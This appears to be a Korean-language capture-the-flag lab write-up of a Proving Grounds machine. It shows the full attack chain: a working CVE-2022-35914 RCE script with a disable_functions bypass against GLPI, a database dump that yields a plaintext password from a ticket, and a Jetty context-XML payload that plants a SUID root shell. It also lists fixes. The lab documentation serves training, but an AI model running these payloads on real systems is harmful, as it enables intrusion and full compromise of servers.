---
tags:
  - type/machine
  - platform/pg
  - os/linux
  - status/solved
  - tech/web/rce
  - tech/cve
  - tech/db/mysql
  - tech/cred/reuse
  - tech/lin/service-as-root
type: machine
platform: pg
os: linux
ip: 192.168.248.242
ports: [22, 80]
services: [http, ssh]
cves: [CVE-2022-35914]
status: solved
manual_tags: true
manual_cves: true
tech_count: 5
---

> [!info] 요약
> 타겟 `192.168.248.242` · Ubuntu 20.04.5 LTS (Focal, 커널 5.4.0-137) · Fundamental · 플래그 2개
> 진입점: 80/GLPI 10.0.2 가 번들 htmLawed 1.2.6 테스트 페이지를 인증 없이 노출 → **CVE-2022-35914**. 공개 PoC(`hhook=exec`)는 `disable_functions` 로 불발, `array_map`→`call_user_func`→`system` 콜백 체인으로 우회해 `www-data` RCE
> 권한상승: DB 설정 파일의 `glpi:glpi_db_password` → 헬프데스크 티켓 followup 본문의 평문 비번 `SnowboardSkateboardRoller234` 로 `betty` SSH → root 로 뜬 Jetty 11.0.12 의 쓰기가능 `webapps/` 에 context XML 투하 → SUID bash → root
> 시행착오·교훈 → [[_PLAYBOOK#B-13. disable_functions 우회 (PHP)]] · [[_PLAYBOOK#B-18. 번들 서드파티 컴포넌트가 진짜 취약점이다]] · [[_PLAYBOOK#B-62. 자격증명은 인증 DB 가 아니라 «애플리케이션 데이터» 에 있다]] · [[_PLAYBOOK#B-34. root 로 도는 서비스의 «쓰기 가능한» 경로 = 권한상승]]

## Target #1 – 192.168.248.242

### Initial Access – 웹루트에 남은 번들 htmLawed 테스트 페이지를 콜백 체인으로 호출해 disable_functions 를 우회한 무인증 RCE

**Vulnerability Explanation:** GLPI 10.0.2 가 번들 HTML 정제 라이브러리 htmLawed 1.2.6 의 데모 페이지를 웹루트 아래 그대로 배포.
- `/vendor/htmlawed/htmlawed/htmLawedTest.php` 가 **인증 없이** 렌더됨. `hook` 파라미터로 지정한 임의 PHP 함수를 `hook($text, $C, $S)` 형태로 호출 → 무인증 원격 코드 실행
- 취약점 부류 — 프로덕션 배포에 남은 서드파티 데모·테스트 스크립트를 통한 PHP callable injection. CVE-2022-35914, NVD 영향범위 표기는 "GLPI through 10.0.2"
- 이 호스트는 `exec` 만 `disable_functions` 로 막혀 공개 PoC 형태(`hhook=exec`)가 불발. `system`·`passthru`·`shell_exec` 는 살아 있어 `array_map`→`call_user_func`→`system` 2단 콜백으로 우회

**Vulnerability Fix:**
- `vendor/` 아래 데모·테스트 스크립트를 배포에서 제거하거나 웹루트 밖으로 뺄 것. GLPI **10.0.3 · 9.5.9** 에서 수정(벤더 공지). 업그레이드 전 임시 조치는 벤더가 지정한 대로 `vendor/htmlawed/htmlawed/htmLawedTest.php` **한 파일만** 삭제 — 같은 디렉터리의 `htmLawed.php` 는 앱이 실제로 쓰는 정상 컴포넌트라 지우면 안 됨. 여기에 `vendor/` 직접 접근 차단을 더할 것
- `disable_functions` 를 `exec` 단독이 아니라 `system`·`passthru`·`shell_exec`·`popen`·`proc_open` 까지 함께 차단할 것. 한 함수만 막는 것은 우회 비용만 올릴 뿐 차단이 아님

**Severity:** Critical — 무인증 원격 RCE

**Steps to reproduce the attack:**
1. `/vendor/htmlawed/htmlawed/htmLawedTest.php` 에 인증 없이 접근되는 것을 확인
2. `hhook=exec` 형태 공개 PoC 투척 → 응답은 정상 페이지, 출력 구간만 빔
3. `text=call_user_func` · `hhook=array_map` · `hfoo=system` · `spec[1]=<CMD>` 로 콜백 체인 구성해 POST
4. 응답 HTML 의 `</form>` 뒤 구간을 잘라 HTML unescape → 명령 출력 회수
5. `id` 로 `www-data` 확인

### Service Enumeration

**Port Scan Results**

| IP Address | Ports Open |
|---|---|
| 192.168.248.242 | TCP: 22, 80 |

```text
# Nmap 7.98 scan initiated Fri Aug 21 07:51:09 2026 as: /usr/lib/nmap/nmap --privileged -sCV -p- -Pn -A --min-rate 5000 -oN /home/kali/PG/GLPI/nmap.log 192.168.248.242
Nmap scan report for 192.168.248.242
Host is up (0.085s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Authentication - GLPI
```
— 출처: `~/PG/GLPI/nmap.log` (발췌 — 22/tcp 아래 `ssh-hostkey` 3줄과 OS 추정·TRACEROUTE 구간 생략)

포트 두 개뿐, 나머지 65533 개는 `filtered`. UDP 경로는 시도하지 않음 [관측 없음].

⚠️ 시각 표기가 두 계통 섞여 있음 — Kali 산출물 mtime·nmap 헤더는 **KST**, HTTP `Date` 헤더와 플래그 증거의 `date` 출력은 **UTC**(KST = UTC+9). 아래에서는 어느 쪽인지 매번 붙임.

리다이렉트도 vhost 요구도 없음 — IP 로 바로 치면 `HTTP/1.1 200 OK` 에 GLPI 로그인 화면이 그대로 옴. `/etc/hosts` 손질 불필요.

```text
HTTP/1.1 200 OK
Date: Thu, 20 Aug 2026 22:51:12 GMT
Server: Apache/2.4.41 (Ubuntu)
Set-Cookie: glpi_8ac3914e6055f1dc4d1023c9bbf5ce82=auisf0hed2f2brrobljjnrbqdo; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html; charset=UTF-8
```
— 출처: `~/PG/GLPI/head_80.txt`

**버전 판정 — 독립 근거 2개**

배너 하나만 믿지 않고 두 신호를 교차함.

근거 ①, `/CHANGELOG.md` 의 첫 버전 항목:

```text
## [10.0.2] unreleased
```
— 출처: `~/PG/GLPI/resp_CHANGELOG.md` 6행. 다음 버전 항목이 26행의 `## [10.0.1] 2022-06-02` 라 10.0.2 가 설치된 최신 항목

근거 ②, `/vendor/htmlawed/htmlawed/htmLawedTest.php` 가 렌더한 페이지 좌상단의 `htmLawed 1.2.6 TEST` — **번들된 취약 모듈 자체**의 버전.

![[PG-GLPI-login.png]]

GLPI 로그인 화면(`http://192.168.248.242/`). 하단 저작권 `GLPI Copyright (C) 2015-2022 Teclib' and contributors` 로 10.0.x 대와 모순 없음.

![[PG-GLPI-htmlawed-testpage.png]]

`/vendor/htmlawed/htmlawed/htmLawedTest.php` 를 인증 없이 그냥 연 화면. 아직 아무것도 제출하지 않은 상태.

**그 밖의 엔드포인트**

`/status.php` 가 인증 없이 내부 상태를 뱉음 — LDAP·IMAP·CAS·메일수집기가 전부 미설정임을 여기서 이미 알 수 있음(뒤의 자격증명 저장소 소거와 일치):

```text
GLPI_DB_OK
GLPI_SESSION_DIR_OK
No LDAP server
No IMAP server
No CAS server
No mail collector
Crontasks_OK

GLPI_OK
```
— 출처: `~/PG/GLPI/resp_status.php`

`/install/install.php` 는 404 — 설치 마법사 재실행 경로는 닫혀 있음(출처: `~/PG/GLPI/resp_install_install.php`).

### Initial Access – htmLawed 테스트 페이지 RCE

**공개 PoC 형태는 이 박스에서 안 먹힘.** 통상 형태는 이것:

```http
POST /vendor/htmlawed/htmlawed/htmLawedTest.php
Cookie: sid=foo

sid=foo&hhook=exec&text=<cmd>
```

응답은 정상 페이지가 통째로 돌아오고 입력도 처리됨(입력 hexdump 가 렌더됨). 그러나 **응답 HTML 의 `</form>` 뒤 출력 구간이 통째로 빔.** `sleep` 을 넣어도 타이밍 지연 없음.

실패 응답 전량이 `~/PG/GLPI/` 에 남아 있고, 출력 구간을 잘라보면 전부 빈 문자열임:

```text
mphp.html   => ''
mtag.html   => ''
t1.html     => ''
t2.html     => ''
t3.html     => ''
m_sleep.html    => ''
m_id.html       => ''
passwd_raw.html => ''
phpinfo.html    => ''
out_matched.html=> ''
poc_id.html     => ''
```
— 위 파일들의 `</form>` 뒤 구간을 `rce.sh` 와 같은 정규식으로 잘라낸 **재추출 결과**(원문은 각 HTML). `rce_a~d.html`·`page1.html`·`p.html` 은 미제출 상태의 테스트 페이지(`resp_vendor_htmlawed_htmlawed_htmLawedTest.php`)와 **크기가 42134바이트로 같음** — 폼이 처리조차 안 된 요청. 단 md5 는 6개가 서로 전부 다름(요청마다 새로 발급되는 `sid`·CSRF 토큰이 페이지에 박히기 때문)이라 바이트 동일은 아님

원인은 PHP 설정:

```text
disable_functions = exec,pcntl_alarm,pcntl_fork,... (exec disabled; system/passthru/shell_exec NOT disabled)
```
— 출처: `~/PG/GLPI/disable_functions.txt`

⚠️ 이 파일은 **작업 중 한 줄로 줄여 적은 요약**이고 `php.ini` 원문 출력은 안 남김 — 목록의 나머지(`...` 부분)는 복원 불가 [관측 없음]. mtime 이 KST 08:20:57 로 root 획득(08:18:24) **뒤**라 정리 시점에 적은 메모임. 산출물 전체에서 `disable_functions` 문자열이 등장하는 파일도 이것 하나뿐.

`exec` 는 막힘. `system`·`passthru`·`shell_exec` 는 목록에 없음 — **살아 있음.** 그래서 막힌 `exec` 대신 열린 `system` 으로 갈아타는 콜백 체인을 씀.

작동한 페이로드:

```http
POST /vendor/htmlawed/htmlawed/htmLawedTest.php
Cookie: sid=foo

text=call_user_func&hhook=array_map&hfoo=system&spec[0]=&spec[1]=<CMD>&sid=foo
```

**페이로드를 조각내면:**

- htmLawed 는 `hook` 이 지정한 함수를 `hook($text, $C, $S)` 형태로 호출. `hhook=array_map` 이므로 실제로 도는 것은 `array_map($text, $C, $S)` = `array_map('call_user_func', $C, $S)`
- `$C` = `['array_map','system']` (hhook, hfoo 에서), `$S` = `[null, '<CMD>']` (spec[0], spec[1] 에서)
- `array_map` 이 두 배열을 병렬로 훑음 — 1회차 `call_user_func('array_map', null)` 는 무해, **2회차 `call_user_func('system', '<CMD>')`** 가 명령 실행
- `exec` 를 안 거치고 `system` 만 타므로 `disable_functions` 우회

**수동 대안 — 자동 도구 없이 curl 한 줄로 끝남.** 익스플로잇 자체가 스크립트 한 장이라 시험 규정상 문제되는 도구를 쓰지 않음:

```bash
#!/bin/bash
CMD="$1"
curl -s --max-time 25 -b 'sid=foo' 'http://192.168.248.242/vendor/htmlawed/htmlawed/htmLawedTest.php'   --data-urlencode 'text=call_user_func'   --data-urlencode 'hhook=array_map'   --data-urlencode 'hfoo=system'   --data-urlencode 'spec[0]='   --data-urlencode "spec[1]=$CMD"   --data-urlencode 'sid=foo' | python3 -c "import sys,re,html; h=sys.stdin.read(); m=re.search(r'</form>\s*(.*?)<br /><a href=.htmLawedTest', h, re.S); print(html.unescape(m.group(1)).strip() if m else '[no-output]')"
```
— 출처: `~/PG/GLPI/rce.sh`

`--data-urlencode` 가 필수임. `spec[0]=` 의 빈 값과 `spec[1]` 의 명령에 공백·따옴표가 들어가므로 `-d` 로 그냥 보내면 파라미터 경계가 깨짐. `-b 'sid=foo'` 는 쿠키와 POST 바디의 `sid` 를 일치시키는 것 — 테스트 페이지가 자체 CSRF 유사 검사로 둘을 대조함.

명령 출력은 응답 HTML 의 마지막 `</form>` 뒤에 그대로 echo 됨. `rce.sh` 가 그 구간을 정규식으로 잘라 unescape.

```bash
./rce.sh 'id'
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
— 출처: `~/PG/GLPI/am_id.html` 의 `</form>` 뒤 구간. 첫 성공 응답임

같은 방식으로 `/etc/passwd` 도 회수됨:

```text
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
```
— 출처: `~/PG/GLPI/am_passwd.html` (발췌)

> [!warning] 여기는 대화형 셸이 아니다
> 웹 RCE 라 OSCP 규정상 이 상태에서 읽은 플래그는 0점("this includes any type of web-based shell"). 플래그는 `betty` SSH 로 정식 셸을 얻은 뒤에 읽음.

**RCE 성공 직후의 화면은 촬영되지 않았음** [관측 없음]. Kali 에 `shot_rce_success.png` 라는 이름의 파일이 있으나 `shot_htmlawed.png` 와 md5 동일(둘 다 `5b8b79b333d505816c05b501ef6f563c`, 62837바이트) — `Service Enumeration` 절의 테스트 페이지 화면이 두 이름으로 저장돼 있었을 뿐. 명령 실행의 증거로 남은 것은 응답 HTML 뿐.

**Local.txt value:** `6d03f563ffa6d429d2c5f682d84f3d20`

`local.txt` 는 `-r--r----- betty betty` 라 **www-data 로는 읽히지 않음**(출처: `~/PG/GLPI/sweep1.txt` 의 `===HOME===` 절). 따라서 값 회수는 `Privilege Escalation` 절의 betty 승격 **뒤**에 이뤄졌고, 한 화면 증거도 그 대화형 SSH 세션에서 찍음 — 출력은 아래 `Privilege Escalation` 절에 있음.

### Privilege Escalation – 티켓 평문 자격증명으로 betty 승격 후 root 로 뜬 Jetty 의 쓰기가능 webapps

**Vulnerability Explanation:** 두 단계가 이어짐.
- **평문 자격증명의 애플리케이션 데이터 저장** — 관리자가 헬프데스크 티켓 followup 본문에 betty 의 새 비밀번호를 평문으로 적었고, 그 비번이 OS 계정(SSH)에도 그대로 재사용됨. `glpi_users` 의 bcrypt 해시를 깰 필요가 없음
- **root 로 실행되는 서비스의 쓰기가능 배포 디렉터리** — Jetty 11.0.12 가 root 로 구동되고 그 `/opt/jetty/jetty-base/webapps` 가 일반 유저 betty 에게 쓰기 가능. Jetty 의 배포 스캐너(DeploymentManager)는 이 디렉터리의 `.war` 와 **context XML 디스크립터**를 자동 배포하고, context XML 은 `Configure` 요소로 임의 Java 객체를 생성·호출할 수 있음 → `java.lang.Runtime.exec` 가 **root 권한으로** 실행됨

**Vulnerability Fix:**
- 평문 비밀번호를 티켓·채팅·KB 본문에 남기지 말 것. 비밀번호 재설정은 유저가 스스로 하는 원타임 링크로. 애플리케이션 비번과 OS 계정 비번을 공유하지 말 것
- Jetty/Tomcat 같은 애플리케이션 서비스를 전용 저권한 계정으로 실행하고 배포 디렉터리의 쓰기 권한을 그 계정으로 제한할 것. 여기서는 **Jetty 가 root 로 돈 것**과 **webapps 가 일반 유저에게 쓰기 가능했던 것** 둘 다 잘못
- DB 계정(`glpi`)에 최소 권한만 부여. 웹 프로세스가 전체 DB 를 `mysqldump` 할 수 있으면 애플리케이션 데이터 전량이 곧 자격증명 저장소가 됨

**Severity:** Critical — 저권한 웹 프로세스에서 시작해 SSH 사용자 계정을 거쳐 root 완전 장악

**Steps to reproduce the attack:**
1. www-data RCE 로 `/var/www/glpi/config/config_db.php` 를 읽어 DB 자격증명 확보
2. `mysqldump` 로 DB 전량을 덤프한 뒤 크레덴셜 문자열을 grep
3. `glpi_itilfollowups` 의 티켓 followup 본문에서 평문 비번 회수
4. 그 비번으로 `betty` SSH 로그인 → 대화형 셸 · local.txt
5. `harvest.sh` 열거로 root 구동 Jetty 와 쓰기가능 `webapps/` 확인
6. `Runtime.exec` 를 호출하는 context XML 을 `webapps/` 에 `scp` 로 투하 → SUID bash 생성
7. `/tmp/rootbash -p` 로 proof.txt 읽기

#### www-data 로 무엇이 보이는가

GLPI 의 DB 설정 파일에서 DB 자격증명 확보.

```php
<?php
class DB extends DBmysql {
   public $dbhost = 'localhost';
   public $dbuser = 'glpi';
   public $dbpassword = 'glpi_db_password';
   public $dbdefault = 'glpi';
   public $use_utf8mb4 = true;
   public $allow_myisam = false;
   public $allow_datetime = false;
   public $allow_signed_keys = false;
}
```
— 출처: `~/PG/GLPI/config_db.txt` (`/var/www/glpi/config/config_db.php`)

`glpi_users` 덤프 — 전원 bcrypt(`$2y$10$`, cost 10):

```text
id	name	password	realname
2	glpi	$2y$10$9DbdMovtCw0eI.FWm18SRu34ErQD6LUzA8AqGUqiEat0S/ahlyHFa	Montgomery
3	post-only	$2y$10$dTMar1F3ef5X/H1IjX9gYOjQWBR1K4bERGf4/oTPxFtJE/c3vXILm	NULL
4	tech	$2y$10$.xEgErizkp6Az0z.DHyoeOoenuh0RcsX4JapBk2JMD6VI17KtB1lO	NULL
5	normal	$2y$10$Z6doq4zVHkSPZFbPeXTCluN1Q/r0ryZ3ZsSJncJqkN3.8cRiN0NV.	NULL
6	glpi-system		Support
7	betty	$2y$10$jG8/feTYsguxsnBqRG6.judCDSNHY4it8SgBTAHig9pMkfmMl9CFa	berta
```
— 출처: `~/PG/GLPI/glpi_users.txt`

betty 해시는 `~/PG/GLPI/betty.hash` 로 따로 떼어 rockyou 로 돌렸으나 안 깨짐. 여기서 크래킹을 붙잡는 것이 이 박스의 함정 — betty 의 비번은 DB 의 **다른 곳에 평문으로** 있음.

#### betty 자격증명 탐색 — 소거된 저장소

- **SSH 자격증명 재사용** — `glpi_db_password`·`betty`·`berta`·`glpi`·`Betty2023`·`password` 6종 전부 `Permission denied, please try again.`(출처: `~/PG/GLPI/ssh_reuse.txt`)
- **GLPI 암호화 크레덴셜 저장소** — 키 `/var/www/glpi/config/glpicrypt.key` 는 www-data 로 읽혔으나(32바이트, hexdump 가 `sweep1.txt` 에 있음) **복호화할 암호문 자체가 없음.** `glpi_configs` 의 `proxy_passwd`·`smtp_passwd` 는 빈 값임이 직접 확인됨(`~/PG/GLPI/db_grep.txt` 2행에 `'proxy_passwd',''`·`'smtp_passwd',''`). LDAP·메일수집기 쪽은 **테이블을 따로 덤프하지 않았고**[관측 없음], 다만 ⓐ DB 전량 grep 에 `glpi_authldaps`·`glpi_mailcollectors` 의 비번이 한 건도 안 걸렸고 ⓑ `Service Enumeration` 의 `/status.php` 가 `No LDAP server`·`No mail collector` 로 보고한 것 두 가지로 부재를 판단함. 존재가 확인된 테이블 이름 목록은 `~/PG/GLPI/tables_cred.txt`
- **betty 홈** — `.bash_history` 는 `/dev/null` 심볼릭 링크, `.ssh/` 디렉터리 없음:

```text
===HOME===
total 24
drwxr-xr-x 2 betty betty 4096 Jan 25  2023 .
drwxr-xr-x 3 root  root  4096 Jan 25  2023 ..
lrwxrwxrwx 1 root  root     9 Jan 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 betty betty  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 betty betty 3771 Feb 25  2020 .bashrc
-rw-r--r-- 1 betty betty  807 Feb 25  2020 .profile
-r--r----- 1 betty betty   33 Aug 20 22:49 local.txt
===SSH===
ls: cannot access '/home/betty/.ssh/': No such file or directory
cat: /home/betty/.ssh/id_rsa: No such file or directory
```
— 출처: `~/PG/GLPI/sweep1.txt` (발췌 — 앞의 `config/` 목록·`===KEY===` hexdump 절 생략). `local.txt` 가 `-r--r----- betty betty` 라 **www-data 로는 못 읽음**이 여기서 확정됨

- **GLPI 세션·로그** — `files/_sessions/` 의 세션 파일은 UI 선호도만, `event.log` 는 betty 로그인 기록(IP `192.168.56.1`)만. 크레덴셜 없음(출처: `~/PG/GLPI/sess_and_logs.txt`)

#### 티켓 본문의 평문 비번

GLPI 는 **헬프데스크**이므로 티켓 데이터를 뒤짐. 전체 DB 를 덤프해 크레덴셜 문자열을 한 번에 grep:

```bash
./rce.sh 'mysqldump -uglpi -pglpi_db_password glpi > /tmp/.g.sql; \
  grep -aoiE ".{120}(password|passwd|betty|ssh).{160}" /tmp/.g.sql'
```

⚠️ **명령 원문은 파일로 안 남았고 위는 결과에서 역산한 형태** [가정]. 실제 호출은 이것과 달랐음이 산출물로 드러남 — 이 정규식이면 출력 창은 최소 283자여야 하는데 `db_grep.txt` 의 실제 줄 길이는 220~290자로 흩어져 있음. 확정되는 것은 **전체 DB 덤프를 떠서 크레덴셜 문자열을 한 번에 grep 했다**는 접근 자체이고, 폭 값은 재현용으로 그대로 쓰지 말 것.

덤프는 779624바이트(출처: `~/PG/GLPI/db_grep.txt` 첫 줄의 `ls -l`, 소유자 `www-data`, `23:15` UTC). grep 결과에서 `glpi_itilfollowups` INSERT 행이 걸림. 해당 두 레코드를 다시 뽑은 것:

```text
*************************** 1. row ***************************
     id: 1
   name: Password Lost
content: <p>Hello Lucas,</p>
<p>Excuse me but i have lost my password access to this server.</p>
<p>I need to finish the Jetty deployment as soon as possible. Could you please provide me a new password ?</p>
<p>Thx a lot for your help.</p>
*************************** 1. row ***************************
      id: 1
users_id: 2
    date: 2022-10-08 20:57:14
 content: <p>Hello Betty,</p>
<p>i changed your password to : SnowboardSkateboardRoller234</p>
<p>Please change it again as soon as you can.</p>
<p>regards.</p>
<p>Lucas</p>
```
— 출처: `~/PG/GLPI/ticket_dump.txt`

티켓 본문이 `Jetty deployment` 를 직접 언급함 — 권한상승 대상까지 이 한 화면에 예고돼 있음.

그 비번으로 betty SSH 로그인. 호출 형태는 대략 아래이나 **명령 원문은 파일로 안 남음** [가정] — `~/.zsh_history` 에 이 박스의 명령이 한 줄도 없음(비대화형 `ssh kali "..."` 로 돌렸고 원격 셸 안에서 친 것은 히스토리에 안 남음). 확정되는 것은 `proof_user.txt` 가 betty 계정으로 찍혔다는 것뿐:

```bash
sshpass -p SnowboardSkateboardRoller234 ssh betty@192.168.248.242
```

대화형 셸에서 user 플래그를 증거 형식으로 읽음(값은 `Initial Access` 절 말미에 표기).

아래는 `~/PG/GLPI/proof_user.txt` 전문 그대로 — 출력을 그대로 리다이렉트한 것이라 파일에 프롬프트는 남지 않았고, 둘째 줄이 작업 중 적어둔 명령 줄:

```text
=== user proof ===
whoami; id; hostname; hostname -I; date; cat /home/betty/local.txt
betty
uid=1000(betty) gid=1000(betty) groups=1000(betty)
glpi
192.168.248.242
Thu 20 Aug 2026 11:16:10 PM UTC
6d03f563ffa6d429d2c5f682d84f3d20
```

#### 열거로 무엇을 발견했는가

betty SSH 셸에서 `harvest.sh` 를 한 번 실행. 발췌(출처: `~/PG/GLPI/harvest_betty.txt`):

```text
===== SUDO =====
sudo: a password is required
(sudo -n 실패 — 비밀번호 필요)
```

```text
===== LISTEN =====
Netid  State   Recv-Q  Send-Q   Local Address:Port    Peer Address:Port Process 
udp    UNCONN  0       0        127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       70           127.0.0.1:33060        0.0.0.0:*            
tcp    LISTEN  0       151          127.0.0.1:3306         0.0.0.0:*            
tcp    LISTEN  0       50             0.0.0.0:8080         0.0.0.0:*            
tcp    LISTEN  0       511            0.0.0.0:80           0.0.0.0:*            
tcp    LISTEN  0       4096     127.0.0.53%lo:53           0.0.0.0:*            
tcp    LISTEN  0       128            0.0.0.0:22           0.0.0.0:*            
```

⚠️ 8080 은 **외부에서 안 보였음** — nmap `-p-` 결과는 22·80 두 개뿐이고 나머지가 전부 `filtered`. 내부 열거로만 드러나는 서비스였음.

```text
root        1260  0.1  4.2 3062996 86124 ?       Sl   22:48   0:02 /usr/bin/java -Djava.io.tmpdir=/tmp -Djetty.home=/opt/jetty -Djetty.base=/opt/jetty/jetty-base --class-path /opt/jetty/jetty-base/resources:/opt/jetty/lib/logging/slf4j-api-2.0.0.jar:/opt/jetty/lib/logging/jetty-slf4j-impl-11.0.12.jar:/opt/jetty/lib/jetty-jakarta-servlet-api-5.0.2.jar:/opt/jetty/lib/jetty-http-11.0.12.jar:/opt/jetty/lib/jetty-server-11.0.12.jar:/opt/jetty/lib/jetty-xml-11.0.12.jar:/opt/jetty/lib/jetty-util-11.0.12.jar:/opt/jetty/lib/jetty-io-11.0.12.jar:/opt/jetty/lib/jetty-security-11.0.12.jar:/opt/jetty/lib/jetty-servlet-11.0.12.jar:/opt/jetty/lib/jetty-webapp-11.0.12.jar:/opt/jetty/lib/jetty-deploy-11.0.12.jar org.eclipse.jetty.xml.XmlConfiguration java.version=11.0.17 ... jetty.base=/opt/jetty/jetty-base jetty.home=/opt/jetty ...
```
— 출처: `~/PG/GLPI/harvest_betty.txt` 382행 (`===== PROCS =====`). 클래스패스는 원문 그대로이고 뒤쪽 시스템 프로퍼티(`java.version.*`·`jetty.*.uri`·`jetty.state` 등)와 `etc/*.xml` 인자 나열만 `...` 로 줄임

```text
===== WRITABLE =====
/home/betty
/home/betty/.cache
/run/user/1000
...
/tmp
...
/opt/jetty/jetty-base/webapps
/var/crash
/var/lib/php/sessions
/var/tmp
```
— 출처: 같은 파일 `===== WRITABLE =====`(`find / -writable -type d` 결과). `...` 는 `/run/*`·`/tmp/.X11-unix` 류 표준 항목 생략

두 사실이 겹침 — **Jetty 11.0.12 프로세스가 root 로 돎**(`ps auxf` 의 USER 컬럼), 그리고 **그 Jetty 의 `webapps/` 가 betty 로 쓰기 가능**. 디렉터리 **소유자**가 누구인지는 이 산출물로 확인 불가 [관측 없음]. 권한상승 조건은 소유가 아니라 쓰기이므로 여기서는 그것으로 충분.

SUID 목록(`===== SUID =====`)은 `pkexec`·`at`·`fusermount` 등 Ubuntu 20.04 기본 구성뿐이고 비표준 항목 없음. 크론도 `no crontab for betty` + `/etc/crontab` 기본값(출처: 같은 파일 `===== CRON =====`).

#### context XML 투하

떨군 디스크립터:

```xml
<?xml version="1.0"?>
<!DOCTYPE Configure PUBLIC "-//Jetty//Configure//EN" "https://www.eclipse.org/jetty/configure_10_0.dtd">
<Configure class="org.eclipse.jetty.server.handler.ContextHandler">
  <Call class="java.lang.Runtime" name="getRuntime">
    <Call name="exec">
      <Arg>
        <Array type="String">
          <Item>/bin/bash</Item>
          <Item>-c</Item>
          <Item>cp /bin/bash /tmp/rootbash;chmod 4755 /tmp/rootbash</Item>
        </Array>
      </Arg>
    </Call>
  </Call>
</Configure>
```
— 출처: `~/PG/GLPI/root.xml`

`Runtime.exec` 에 문자열 하나가 아니라 `String[]` 배열로 넘기는 것이 요점. 단일 문자열로 넘기면 Java 가 공백으로 토큰을 쪼개기만 하고 셸을 거치지 않아 `;` 와 리다이렉션이 안 먹음. `/bin/bash -c '<한 줄>'` 형태로 감싸야 두 명령이 순서대로 돎.

betty 로 배포하고 스캔 대기:

```bash
scp root.xml betty@192.168.248.242:/opt/jetty/jetty-base/webapps/root.xml
```

배포에서 SUID 파일 생성까지 몇 초. 정확한 대기 시간은 재보지 않았으나 `/tmp/rootbash` 의 mtime 이 `23:17`(UTC), root 플래그를 읽은 시각이 `23:17:47`(UTC) 이라 1분 안쪽.

```text
-rwsr-xr-x  1 root  root  1183448 Aug 20 23:17 rootbash
```
— 출처: `~/PG/GLPI/harvest_betty.txt` `===== TMP =====`

SUID root bash 확보. `-p` 로 유효 UID 를 유지한 채 실행.

### Post-Exploitation

**Proof.txt value:** `cbd9b70cece6cc1034f38803d1716d1e`

아래는 `~/PG/GLPI/proof_root.txt` 전문 그대로 — 둘째 줄이 작업 중 적어둔 명령 줄:

```text
=== root proof ===
/tmp/rootbash -p -c whoami;id;hostname;hostname -I;date;cat /root/proof.txt
root
uid=1000(betty) gid=1000(betty) euid=0(root) groups=1000(betty)
glpi
192.168.248.242
Thu 20 Aug 2026 11:17:47 PM UTC
/root/proof.txt
cbd9b70cece6cc1034f38803d1716d1e
```

`euid=0(root)` — SUID 비트라 real UID 는 betty 지만 유효 UID 는 root. 이 상태로 `/root/proof.txt` 를 읽음.

⚠️ 둘째 줄(작업 중 적어둔 명령 줄)이 실제 출력을 다 설명하지 못함 — 값 바로 앞의 `/root/proof.txt` 한 줄은 `cat` 이 낼 수 없는 출력이라 실제로는 `ls`(또는 그에 준하는 경로 출력)가 하나 더 끼어 있었음 [가정]. 또 `id` 가 `euid=0` 을 보이는 것으로 보아 이 줄들은 `;` 로 끊긴 betty 셸이 아니라 **이미 열려 있던 `rootbash -p` 세션 안에서** 실행됨. 명령 줄은 사후 메모이고 **출력 쪽이 실측**임.

**root 권한 열거 기록이 하나도 없음** [관측 없음]

harvest 는 이 박스에서 **딱 한 번** 돌았고 그 한 번이 root 를 잡은 **뒤**였음 — 파일 안 `===== DATE =====` 가 `23:18:48`(UTC), root 플래그가 `23:17:47`(UTC). 그런데도 수집 내용은 전부 betty 수준으로, `===== WHOAMI =====` 가 `uid=1000(betty) gid=1000(betty) groups=1000(betty)` 이고 `euid=0` 이 안 붙음.

원인은 harvest 를 띄운 방식. 같은 파일의 `===== PROCS =====` 에 그 프로세스가 남아 있음:

```text
root        3356  0.0  0.1   6892  3224 pts/0    S+   23:18   0:00              \_ /tmp/rootbash -p -c sh /tmp/.h.sh > /tmp/.hv.txt 2>&1; wc -l /tmp/.hv.txt
```
— 출처: `~/PG/GLPI/harvest_betty.txt` 367행

`rootbash -p` 까지는 root(`ps` 의 USER 컬럼이 `root`). 그 다음 `sh /tmp/.h.sh` 로 넘기는 순간 유효 UID 가 빠짐 — Ubuntu 의 `/bin/sh` 는 dash 이고, dash 는 시작할 때 euid ≠ ruid 면 euid 를 ruid 로 되돌림. ⚠️ **`sh` 를 `bash` 로 바꾸는 것만으로는 안 고쳐짐** — bash 도 `-p` 없이 뜨면 같은 강등을 함(Kali 재현: `rootbash -p -c 'id'` → `euid=0`, `-c 'sh -c id'`·`-c 'bash -c id'` → 소실, `-c 'bash -p -c id'` → `euid=0` 유지). 재현 절차와 함정은 [[_PLAYBOOK#B-33. SUID 셸로 스크립트를 넘기면 euid 가 날아간다 (dash)]].

그 결과 `/etc/shadow` 는 harvest 의 `-- shadow (읽히면) --` 아래가 비어 있고, `===== FLAGS =====` 에는 `/home/betty/local.txt` 만 있음. root 크론·root 프로세스 환경도 마찬가지. 셸 획득 직후에 돌렸어야 할 **user 단계 harvest 도 없음** — 남은 harvest 는 이 한 개뿐이고 박스는 이미 정지돼 다시 걷을 수 없음.

Jetty 를 발견한 열거 자체의 출력도 파일로 안 남음 [관측 없음]. `root.xml` 이 Kali 에 만들어진 시각이 KST `08:06:31` 인데 betty 의 비번을 찾아낸 `ticket_dump.txt` 는 KST `08:15:45` — **www-data 단계에서 이미 Jetty 를 보고 페이로드를 준비해 둔 것**이고, 그때 친 `ps`·`ls` 의 출력은 저장되지 않음. 위의 harvest 발췌는 그 발견을 사후에 뒷받침하는 기록이지 발견 당시의 기록이 아님.

**남긴 흔적**

